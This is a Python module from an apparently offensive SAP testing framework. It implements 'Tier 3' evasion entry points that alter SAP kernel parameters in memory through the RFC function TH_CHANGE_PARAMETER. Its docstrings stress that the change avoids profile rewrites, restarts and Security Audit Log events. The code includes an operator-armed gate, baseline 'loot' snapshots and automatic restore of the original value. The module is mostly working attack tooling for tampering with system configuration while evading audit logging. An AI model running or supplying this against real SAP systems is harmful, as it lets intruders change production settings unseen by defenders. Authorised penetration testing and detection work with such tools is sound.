"""Tier 3 active-manipulation entry points.

This module hosts one entry function per registered Tier 3 technique
(``sapmap_evasion_gate.TIER3_TECHNIQUES``).  Every entry:

  1. Asserts the operator-armed gate
     (``assert_evasion_allowed``) — refuses with ``EvasionGateError``
     otherwise.
  2. Captures a baseline snapshot if none exists.
  3. Runs the body under ``evasion_window`` so restore-on-exit is
     wired correctly.
  4. Mutates the kernel via ``change_param`` (``TH_CHANGE_PARAMETER``,
     RFC-enabled, dynamic, in-memory only).
  5. ``evasion_window`` restores the baseline value on exit (including
     exception path) by calling ``restore_baseline`` which also uses
     ``TH_CHANGE_PARAMETER`` under the hood.

Entry-point signature for every technique::

    tier3_<name>(state, node, **params) -> dict

returning ``{ok, technique, applied, baseline_value, snapshot_loot,
error}``.
"""

from __future__ import annotations

import logging
from typing import Optional

from sapmap_evasion_baseline import (capture_baseline, change_param,
                                       evasion_window)
from sapmap_evasion_gate import (assert_evasion_allowed,
                                   EvasionGateError, technique_label)

logger = logging.getLogger(__name__)


def _wrap_result(technique: str, ok: bool, **extra) -> dict:
    out = {"ok": ok, "technique": technique,
            "label": technique_label(technique)}
    out.update(extra)
    return out


def tier3_set_param(state, node, param: str, value: str,
                     creds=None) -> dict:
    """4.A.2 / 4.C.4 — dynamic kernel-parameter set via TH_CHANGE_PARAMETER.

    Asserts the gate, captures a baseline, then writes ``param=value``
    via the RFC-enabled FM ``TH_CHANGE_PARAMETER`` inside an evasion
    window so the captured baseline value is automatically restored on
    exit (or on exception).

    The change is in-memory only — no profile file rewrite, no kernel
    restart, no AUM/AUW SAL events.  Survives until restore_baseline
    is called by ``evasion_window.__exit__``.
    """
    technique = "rz11_dynamic_set"
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return _wrap_result(
            technique, False,
            error="baseline capture returned empty; refusing to mutate",
            applied=False)

    original = snap.params.get(param)
    if isinstance(original, str) and original.startswith("__UNCAPTURED__"):
        return _wrap_result(
            technique, False,
            error=f"{param} could not be baseline-captured "
                   f"({original.split(':', 1)[-1].strip()}); refusing",
            applied=False)

    write_result = {"ok": False, "error": "not attempted"}
    try:
        with evasion_window(node, state, technique,
                             creds=creds,
                             touched_params=[param]):
            write_result = change_param(node, creds, param, value)
            if write_result["ok"]:
                print(f"[+] {snap.sid}: TH_CHANGE_PARAMETER — "
                      f"{param}={value!r} (baseline {param}={original!r})")
            else:
                print(f"[-] {snap.sid}: TH_CHANGE_PARAMETER failed — "
                      f"{param}={value!r}: {write_result['error']}")
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    return _wrap_result(
        technique, write_result["ok"],
        param=param, requested_value=value,
        baseline_value=original,
        applied=write_result["ok"],
        error=write_result["error"] if not write_result["ok"] else "",
        snapshot_loot=snap.loot_path)


def tier3_capture_baseline_only(state, node, creds=None) -> dict:
    """Standalone baseline capture without invoking any mutation.

    Useful for the GUI's Pre-flight panel — the operator can confirm
    a baseline JSON exists for the target before arming any other
    Tier 3 technique.  Doesn't go through ``evasion_window`` because
    there's nothing to restore.
    """
    technique = "rz11_dynamic_set"   # arbitrary registered id used for the
                                       # gate; nothing actually mutates
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "baseline_capture",
                "error": str(e), "snapshot_loot": ""}

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return {"ok": False, "technique": "baseline_capture",
                "error": "capture returned empty (no params readable)",
                "snapshot_loot": ""}

    # Mark on the session config that a baseline now exists.  This is
    # what unblocks the `require_baseline` check for other techniques.
    try:
        from sapmap_evasion import EvasionConfig
        cfg = EvasionConfig.from_dict(state.evasion or {})
        cfg.baseline_captured_at = snap.captured_at
        state.evasion = cfg.to_dict()
    except Exception as e:
        logger.warning(f"could not persist baseline timestamp: {e}")

    return {"ok": True, "technique": "baseline_capture",
            "sid": snap.sid, "captured_at": snap.captured_at,
            "snapshot_loot": snap.loot_path,
            "param_count": len(snap.params),
            "filter_row_count": len(snap.sal_filter_rows)}
